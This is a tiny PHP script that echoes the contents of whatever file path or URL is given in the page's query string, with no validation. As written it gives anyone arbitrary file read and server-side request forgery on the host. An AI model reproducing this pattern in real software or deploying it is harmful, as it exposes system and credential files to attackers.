<?
echo iconv('Windows-1251','Windows-1251',file_get_contents($_SERVER['QUERY_STRING']));
?>